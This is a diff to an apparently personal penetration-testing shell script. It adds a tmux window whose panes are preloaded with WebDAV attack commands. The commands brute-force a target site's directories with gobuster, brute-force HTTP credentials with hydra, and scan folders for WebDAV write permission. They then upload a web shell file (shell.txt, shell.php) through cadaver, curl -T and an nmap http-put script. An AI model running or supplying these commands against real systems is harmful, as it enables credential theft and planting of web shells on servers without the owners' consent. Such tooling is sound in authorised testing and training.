@@ -87,6 +87,37 @@ cd $folderProject
 
 
 
+
+# WEB DAV
+cd $folderProjectWebFingerprint
+# Layout
+tmux new-window -t PT:4 -n 'WEB DAV'
+tmux split-window -v -t PT:4.0
+tmux split-window -v -t PT:4.1
+tmux split-window -v -t PT:4.2
+tmux split-window -v -t PT:4.3
+tmux select-pane -t "4.3"
+tmux split-window -h -t "4.3"
+tmux split-window -h -t "4.3"
+
+# Esecuzione dei comandi nelle sottofinestre
+ 
+tmux send-keys -t PT:4.0 "# Bruteforce attack to get Target Site Folders" Enter
+tmux send-keys -t PT:4.0 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
+tmux send-keys -t PT:4.1 "# Bruteforce attack to get credentials to specific folder" Enter
+tmux send-keys -t PT:4.1 "hydra -L $pathFile_users -P $pathFile_passwords $site http-get /"
+tmux send-keys -t PT:4.2 "# testing site folders (by means of dictionary) to find webDav permission. User and Passwprd should be provided even if they are not required" Enter
+tmux send-keys -t PT:4.2 "$folderProjectEngine/webDAV-scanner.sh /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt http://$site wampp xampp"
+tmux send-keys -t PT:4.3 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:4.3 "cadaver $ip"
+tmux send-keys -t PT:4.4 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:4.4 "curl -T shell.txt -u login:password http://$ip"
+tmux send-keys -t PT:4.5 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:4.5 "nmap -p 80 --script http-put --script-args http-put.url=\"/test/shell.php\",http-put.file=\"shell.php\" $ip"
+cd $folderProject
+
+
+
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 
